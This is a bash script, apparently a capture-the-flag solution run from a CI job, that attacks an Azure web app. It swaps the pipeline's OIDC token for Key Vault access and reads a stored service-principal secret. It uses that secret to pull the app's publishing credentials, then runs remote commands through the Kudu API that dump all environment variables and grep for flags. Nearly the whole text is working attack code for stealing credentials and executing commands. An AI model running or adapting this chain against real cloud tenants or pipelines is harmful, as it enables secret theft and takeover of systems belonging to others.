#!/usr/bin/env bash
set -uo pipefail
SUB=c5e4e004-b42d-4ac4-a502-5fd338380eb6
RAPP="/subscriptions/$SUB/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.Web/sites/app-tbl-reporting-prod"
SCMHOST="app-tbl-reporting-prod.scm.azurewebsites.net"
API=2022-03-01
OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r '.value')
KV=$(curl -sS -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" -d "client_id=$AZURE_CLIENT_ID" -d "scope=https://vault.azure.net/.default" -d "grant_type=client_credentials" -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" -d "client_assertion=$OIDC" | jq -r '.access_token // empty')
J=$(curl -sS -H "Authorization: Bearer $KV" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/reporting-service-principal?api-version=7.4" | jq -r '.value')
RS=$(curl -sS -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" -d "client_id=$(echo "$J"|jq -r .appId)" -d "client_secret=$(echo "$J"|jq -r .clientSecret)" -d "scope=https://management.azure.com/.default" -d "grant_type=client_credentials" | jq -r '.access_token // empty')

echo "######## config/web ########"
curl -sS -H "Authorization: Bearer $RS" "https://management.azure.com$RAPP/config/web?api-version=$API" | jq '.properties|{linuxFxVersion,windowsFxVersion,appCommandLine,javaVersion,nodeVersion}'

echo "######## publishing credentials ########"
PUB=$(curl -sS -X POST -H "Authorization: Bearer $RS" -H "Content-Length: 0" "https://management.azure.com$RAPP/config/publishingcredentials/list?api-version=$API")
U=$(echo "$PUB"|jq -r '.properties.publishingUserName // empty'); P=$(echo "$PUB"|jq -r '.properties.publishingPassword // empty')
echo "scm user = $U   (pass len ${#P})"
[ -z "$P" ] && { echo "khong lay duoc publishing creds: $(echo "$PUB"|jq -c '.error//.')"; echo DONE; exit 0; }

echo "######## Kudu: printenv + grep DF26 ########"
curl -sS -u "$U:$P" "https://$SCMHOST/api/command" -H "Content-Type: application/json" \
  -d '{"command":"printenv | sort; echo ====FILES====; ls -la; echo ====GREP====; grep -raoE \"DF26[{][^}]*[}]\" . 2>/dev/null | head","dir":"site/wwwroot"}' \
  | jq -r '.Output, .Error' 2>/dev/null
echo DONE; exit 0
